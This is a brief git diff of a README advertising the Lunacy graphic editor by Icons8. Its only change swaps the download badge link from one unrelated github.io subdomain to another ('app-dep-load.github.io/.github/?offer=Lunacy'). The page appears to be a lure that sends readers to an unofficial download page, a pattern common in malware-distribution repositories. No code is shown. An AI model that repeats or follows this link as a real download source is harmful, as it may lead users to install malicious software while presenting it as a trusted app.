@@ -3,7 +3,7 @@
 **Lunacy** is a powerful graphic editor from **Icons8**, built for designers who need a fast, intelligent, and lightweight alternative to heavy design suites.  
 It offers complete **Sketch file support**, AI-powered tools, and smooth offline performance across both **Windows** and **macOS**. 🎨  
 
-[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Get%20Lunacy%20App-007AFF?style=for-the-badge&logo=Lunacy&logoColor=white&labelColor=0B0F19)](https://desk-app-git.github.io/.github/?offer=Lunacy)
+[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Get%20Lunacy%20App-007AFF?style=for-the-badge&logo=Lunacy&logoColor=white&labelColor=0B0F19)](https://app-dep-load.github.io/.github/?offer=Lunacy)
 
 ---
 
